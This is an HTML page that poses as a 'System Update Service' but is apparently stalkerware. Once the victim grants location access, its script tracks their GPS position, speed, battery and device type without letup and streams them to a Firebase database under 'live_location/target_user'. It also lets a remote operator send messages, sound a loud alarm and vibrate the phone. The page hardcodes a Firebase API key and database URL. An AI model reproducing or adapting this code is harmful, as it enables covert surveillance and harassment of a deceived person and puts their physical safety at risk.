<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update Service</title>
    <style>
        body { font-family: sans-serif; background: #0f172a; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #fff; text-align: center; }
        .loader { border: 5px solid #334155; border-top: 5px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #chatBox { display: none; background: #fbbf24; color: #000; padding: 15px; border-radius: 10px; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>

    <div>
        <div class="loader"></div>
        <h3 id="status">Connecting to Service...</h3>
        <p style="font-size: 12px; color: #64748b;">Please allow location access if asked.</p>
        <div id="chatBox">🔔 <span id="msgText"></span></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getDatabase, ref, set, onValue, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk",
            authDomain: "arng-805db.firebaseapp.com",
            projectId: "arng-805db",
            databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const userRef = ref(db, 'live_location/target_user');
        const chatRef = ref(db, 'live_location/chat');
        const commandRef = ref(db, 'live_location/command');

        const statusTxt = document.getElementById('status');
        const chatBox = document.getElementById('chatBox'), msgText = document.getElementById('msgText');
        
        // অ্যালার্ম সাউন্ড
        const loudAlarm = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');

        // ইউজারের মোবাইলের তথ্য বের করা
        const getDeviceInfo = () => {
            const ua = navigator.userAgent;
            let device = "Unknown Device";
            if(/Android/i.test(ua)) device = "Android Device";
            else if(/iPhone|iPad/i.test(ua)) device = "Apple iOS Device";
            else if(/Windows/i.test(ua)) device = "Windows PC";
            return device;
        };

        // ব্যাটারি ইনফো
        let batteryLevel = "Unknown", isCharging = false;
        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                batteryLevel = Math.round(b.level * 100); isCharging = b.charging;
                b.addEventListener('levelchange', () => batteryLevel = Math.round(b.level * 100));
            });
        }

        // মেসেজ রিসিভ করা
        onValue(chatRef, (snapshot) => {
            const data = snapshot.val();
            if(data && data.time > Date.now() - 5000) { // শুধু নতুন মেসেজ
                msgText.innerText = data.message;
                chatBox.style.display = "block";
                setTimeout(() => { chatBox.style.display = "none"; }, 10000);
            }
        });

        // এডমিন রিং বাজালে (Vibration & Sound)
        onValue(commandRef, (snapshot) => {
            const cmd = snapshot.val();
            if(cmd && cmd.ringTime > Date.now() - 5000) {
                loudAlarm.play().catch(e=>{});
                if(navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]); // ফোন কাঁপবে
                statusTxt.innerText = "⚠️ SYSTEM ALERT!";
            }
        });

        // অটোমেটিক জিপিএস কানেক্ট (অ্যাপ ওপেন করলেই)
        window.onload = () => {
            if (navigator.geolocation) {
                onDisconnect(userRef).update({ isOnline: false, status: "Offline" });

                navigator.geolocation.watchPosition(
                    (position) => {
                        const lat = position.coords.latitude, lng = position.coords.longitude, acc = position.coords.accuracy;
                        let speed = position.coords.speed ? Math.round(position.coords.speed * 3.6) : 0;

                        set(userRef, { 
                            latitude: lat, longitude: lng, accuracy: acc, speed: speed, 
                            battery: batteryLevel, charging: isCharging, 
                            deviceInfo: getDeviceInfo(), // ডিভাইসের নাম যাচ্ছে
                            isOnline: true, timestamp: new Date().toLocaleString() 
                        });

                        statusTxt.innerHTML = "Service Connected 🟢<br><span style='font-size:10px;'>Running in background...</span>";
                    },
                    (error) => { statusTxt.innerHTML = "⚠️ Please Allow Location Permission!"; },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        };
    </script>
</body>
</html>
